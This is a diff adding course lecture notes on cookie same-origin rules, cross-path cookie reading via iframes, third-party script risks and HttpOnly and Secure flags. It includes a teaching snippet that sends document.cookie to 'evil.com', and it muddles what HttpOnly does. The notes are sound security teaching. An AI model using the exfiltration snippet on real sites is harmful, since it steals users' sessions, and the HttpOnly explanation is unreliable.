@@ -206,3 +206,55 @@
         ![CORS success](img/2022-04-18-cors-success.png)
     - Example: CORS failure
         ![CORS failure](img/2022-04-18-cors-failure.png)
+
+### Same-Origin Policy for Cookies
+
+* Cookies have different definition of origin than DOM: `(domain, path)`
+    - e.g. `(cs155.stanford.edu, /foo/bar)`
+* A page can set cookie for its domain or any parent domain (as long as parent domain is not a public suffix)
+    - Can set a cookie for its path or any parent path
+    - e.g. `stanford.edu` cannot set for `cs155.stanford.edu`, but vice versa is possible
+    - e.g. `website.com/login` can set cookie for `website.com`, but not vice versa
+* Browser sends cookies that are in a URL's scope
+    - Scope: belongs to domain or parent domain, and is located at the same path or parent path
+
+#### Javascript cookie access
+
+* Developers can additionally manipulate in-scope cookies through Javascript by modifying values in `document.cookie`:
+    ```js
+    document.cookie = "name=aditya";
+    function alertCookie() {
+        alert(document.cookie);
+    }
+    ```
+    ```html
+    <button onclick="alertCookie()">Show Cookies</button>
+    ```
+* This leads to a SOP policy collision. On `cs.stanford.edu/zakir`, run the following code, which will actually show `dabo`'s cookies on `zakir`'s page:
+    ```js
+    const iframe = document.createElement("iframe");
+    iframe.src = "https://cs.stanford.edu/dabo";
+    document.body.appendChild(iframe);
+    alert(iframe.contentWindow.document.cookie);
+    ```
+
+#### Third-party cookie access
+
+* If bank inclues Google Analytics Javascript (from `google.com`), it can access bank's auth. cookie, since Javascript always runs with permissions of the window
+    ```js
+    const img = document.createElement("image");
+    img.src = "https://evil.com/?cookies=" + document.cookie;
+    document.body.appendChild(img);
+    ```
+* To prevent: HttpOnly Cookies - setting to prevent cookies from being accessed by `document.cookie` API
+    - Never sent by browser because `(google.com, /)` does not match `(bank.com, /)`
+    - Cannot be extracted by Google Javascript that runs on `bank.com`
+    ```http
+    Set-Cookie: id=a3fWa; Expires=Thu, 21 Apr 2022 16:20:00 GMT; HttpOnly
+    ```
+    - This is OK if everything is done over TLS, so network attacker cannot see traffic
+    - However, if attacker tricks user into visiting `http://bank.com`, since there is no scheme in Cookie SOP, attacker can see the cookie
+* Secure Cookies: only send to server with an encrypted request over HTTPS protocol
+    ```http
+    Set-Cookie: id=a3fWa; Expires=Thu, 21 Apr 2022 16:20:00 GMT; Secure
+    ```
